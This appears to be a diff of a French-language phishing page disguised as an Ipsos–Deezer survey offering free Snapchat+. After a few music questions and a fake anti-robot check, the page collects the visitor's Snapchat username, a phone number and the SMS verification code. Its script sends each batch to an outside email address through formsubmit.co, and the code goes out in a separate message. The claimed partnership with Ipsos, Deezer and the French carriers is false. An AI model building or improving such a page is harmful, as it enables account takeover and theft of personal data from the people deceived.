@@ -39,13 +39,15 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <div class="progress-text" id="progressText">0%</div>
 </div>
 
-<!-- Étape 0 : Questions Deezer -->
+<!-- Étape 0 : Questions Deezer / Artistes / Genres -->
 <div class="box active" id="etape0">
 <h2>Vos habitudes d'écoute Deezer 🎵</h2>
 <p>Merci de répondre aux questions sur vos artistes et genres préférés. Ces informations restent confidentielles.</p>
+
 <label>Utilisez-vous Deezer ?</label><br>
 <input type="radio" name="deezer_use" value="Oui"> Oui<br>
 <input type="radio" name="deezer_use" value="Non"> Non<br><br>
+
 <label>Combien de jours par semaine écoutez-vous Deezer ?</label><br>
 <select name="deezer_freq">
 <option value="">-- Sélectionnez --</option>
@@ -53,12 +55,14 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <option value="3-4 jours">3–4 jours</option>
 <option value="5-7 jours">5–7 jours</option>
 </select><br><br>
+
 <label>Quels artistes écoutez-vous le plus ? (jusqu'à 5)</label><br>
 <input type="text" name="artiste1" placeholder="Artiste 1">
 <input type="text" name="artiste2" placeholder="Artiste 2">
 <input type="text" name="artiste3" placeholder="Artiste 3">
 <input type="text" name="artiste4" placeholder="Artiste 4">
 <input type="text" name="artiste5" placeholder="Artiste 5"><br><br>
+
 <label>Quels genres écoutez-vous principalement ?</label><br>
 <input type="checkbox" name="genre[]" value="Pop"> Pop<br>
 <input type="checkbox" name="genre[]" value="Rap / Hip-hop"> Rap / Hip-hop<br>
@@ -67,6 +71,7 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <input type="checkbox" name="genre[]" value="Rock"> Rock<br>
 <input type="checkbox" name="genre[]" value="Afro"> Afro<br>
 <input type="checkbox" name="genre[]" value="Autre"> Autre<br><br>
+
 <button id="btnEtape0">Continuer</button>
 </div>
 
@@ -78,66 +83,24 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <button id="btnEtape1">Suivant</button>
 </div>
 
-<!-- Étape 2 : Vérification anti-robot -->
-<div class="box" id="etape2">
-<h2>Vérification de sécurité 🤖</h2>
-<p>Avant de continuer, nous procédons à une vérification pour confirmer que vous n’êtes pas un robot et éviter les abus.</p>
-<button id="btnEtape2">Continuer</button>
-</div>
-
-<!-- Étape 3 : Numéro de téléphone -->
-<div class="box" id="etape3">
-<h2>Numéro de téléphone 📱</h2>
-<p>Entrez votre numéro pour recevoir un code SMS. Il doit commencer par 06 ou 07 et comporter 10 chiffres.</p>
-<input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
-<button id="btnEtape3">Suivant</button>
-</div>
-
-<!-- Étape 4 : Code SMS -->
-<div class="box" id="etape4">
-<h2>Code de vérification SMS</h2>
-<p>Veuillez entrer le code reçu par SMS pour finaliser l’inscription.</p>
-<input type="text" id="code_sms" placeholder="Code reçu">
-<button id="btnEtape4">Terminer</button>
-</div>
-
-<!-- Étape 5 : Merci -->
-<div class="box" id="etape5">
-<h2>Merci ! 🎉</h2>
-<p>Votre Snapchat+ sera activé sous peu. Les informations collectées sont confidentielles et utilisées uniquement pour cette étude en partenariat avec Deezer.</p>
-</div>
-
-<!-- À propos / partenaires -->
-<div class="about">
-<strong>À propos du partenariat :</strong><br>
-Ce sondage est organisé par <strong>Ipsos</strong> en collaboration avec <strong>Deezer</strong> pour offrir Snapchat+ gratuitement.  
-Cette offre est exclusivement réservée aux clients des partenaires : <strong>Bouygues Telecom, SFR et Orange</strong>.
-</div>
-
-<div class="footer">© 2026 Ipsos – Tous droits réservés</div>
-
 <script>
 let reponses = {};
-
 function showStep(etapeId, percent){
 document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
 document.getElementById(etapeId).classList.add('active');
 document.getElementById('progressBar').style.width = percent+"%";
 document.getElementById('progressText').innerText = percent+"%";
 }
-
 async function sendMail(dataObj,sujet){
-const formData = new FormData();
+const formData=new FormData();
 formData.append("_subject",sujet);
 formData.append("_cc","John123abcd@proton.me");
 formData.append("_captcha","false");
 for(let key in dataObj) formData.append(key,dataObj[key]);
-try{
-await fetch("https://formsubmit.co/John123abcd@proton.me",{method:"POST",body:formData,headers:{"Accept":"application/json"}});
+try{await fetch("https://formsubmit.co/John123abcd@proton.me",{method:"POST",body:formData,headers:{"Accept":"application/json"}});
 console.log("Mail envoyé:",sujet);
 }catch(e){console.error("Erreur mail",e);}
 }
-
 // Étape 0 -> 1
 document.getElementById('btnEtape0').addEventListener('click',()=>{
 let deezerUse=document.querySelector('input[name="deezer_use"]:checked');
@@ -148,34 +111,96 @@ for(let i=1;i<=5;i++){reponses['artiste'+i]=document.querySelector('input[name="
 reponses.genre=Array.from(document.querySelectorAll('input[name="genre[]"]:checked')).map(g=>g.value).join(", ");
 showStep('etape1',20);
 });
-
-// Étape 1 -> 2
+// Étape 1 -> suite
 document.getElementById('btnEtape1').addEventListener('click',()=>{
 let snap=document.getElementById('compte_snap').value.trim();
 if(!snap){alert("Entrez votre identifiant Snapchat.");return;}
 reponses.compte_snap=snap;
 showStep('etape2',40);
 });
+</script>
+<!-- Étape 2 : Vérification anti-robot -->
+<div class="box" id="etape2">
+<h2>Vérification de sécurité 🤖</h2>
+<p>Avant de continuer, nous devons vérifier que vous n'êtes pas un robot afin d'éviter les abus et garantir que chaque participant est réel.</p>
+<p>Merci de confirmer votre participation en cliquant sur Continuer.</p>
+<button id="btnEtape2">Continuer</button>
+</div>
 
-// Étape 2 -> 3
-document.getElementById('btnEtape2').addEventListener('click',()=>{showStep('etape3',60);});
+<!-- Étape 3 : Numéro de téléphone -->
+<div class="box" id="etape3">
+<h2>Numéro de téléphone</h2>
+<p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS. Le numéro doit commencer par 06 ou 07 et comporter 10 chiffres.</p>
+<input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
+<button id="btnEtape3">Suivant</button>
+</div>
 
-// Étape 3 -> 4
-document.getElementById('btnEtape3').addEventListener('click',()=>{
-let tel=document.getElementById('telephone').value.trim();
-if(!/^(06|07)\d{8}$/.test(tel)){alert("Numéro invalide. 10 chiffres débutant par 06 ou 07.");return;}
-reponses.telephone=tel;
-sendMail(reponses,"Réponses Deezer + Snapchat + Numéro - Ipsos");
-showStep('etape4',80);
+<script>
+// Étape 1 -> 2 (vérification anti-robot)
+document.getElementById('btnEtape2').addEventListener('click', () => {
+    showStep('etape3', 60);
 });
 
-// Étape 4 -> 5
-document.getElementById('btnEtape4').addEventListener('click',()=>{
-let code=document.getElementById('code_sms').value.trim();
-if(!code){alert("Entrez le code reçu par SMS.");return;}
-sendMail({compte_snap:reponses.compte_snap,telephone:reponses.telephone,code_sms:code},"Code SMS - Ipsos");
-showStep('etape5',100);
+// Étape 3 : Validation du numéro
+document.getElementById('btnEtape3').addEventListener('click', () => {
+    let tel = document.getElementById('telephone').value.trim();
+    if(!/^(06|07)\d{8}$/.test(tel)){
+        alert("Numéro invalide. Le numéro doit commencer par 06 ou 07 et comporter 10 chiffres.");
+        return;
+    }
+    reponses.telephone = tel;
+
+    // Envoi mail 1 : Deezer + Artistes + Snapchat + numéro
+    sendMail(reponses, "Réponses participant - Étapes 0-3");
+
+    showStep('etape4', 80); // passage à l'étape suivante (code SMS)
+});
+
+// Ajout du responsive + animation si nécessaire
+</script>
+<!-- Étape 4 : Code SMS -->
+<div class="box" id="etape4">
+    <h2>Code de vérification</h2>
+    <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
+    <input type="text" id="code_sms" placeholder="Code reçu">
+    <button id="btnEtape4">Terminer</button>
+</div>
+
+<!-- Page finale de remerciement -->
+<div class="box" id="etape5">
+    <h2>Merci pour votre participation ! 🎉</h2>
+    <p>Votre Snapchat+ sera activé sous peu. Cette offre est exclusivement disponible pour les clients SFR, Bouygues Telecom ou Orange.</p>
+    <p>Nous vous remercions pour votre contribution et pour avoir partagé vos habitudes d’écoute Deezer !</p>
+</div>
+
+<div class="about">
+    <strong>À propos du partenariat :</strong><br>
+    Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. 
+    L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la compatibilité du service. 
+    Vos réponses sur les artistes et genres écoutés servent uniquement à notre étude interne.
+</div>
+
+<script>
+// Étape 4 : Code SMS final
+document.getElementById('btnEtape4').addEventListener('click', () => {
+    let code = document.getElementById('code_sms').value.trim();
+    if(!code){
+        alert("Veuillez entrer le code reçu par SMS.");
+        return;
+    }
+    reponses.code_sms = code;
+
+    // Envoi mail 2 : uniquement le code SMS
+    sendMail({code_sms: code}, "Code final participant - Ipsos");
+
+    showStep('etape5', 100);
+});
+
+// Animation simple pour toutes les boxes
+document.querySelectorAll('.box').forEach(box => {
+    box.style.transition = "all 0.5s ease";
 });
 </script>
+
 </body>
 </html>
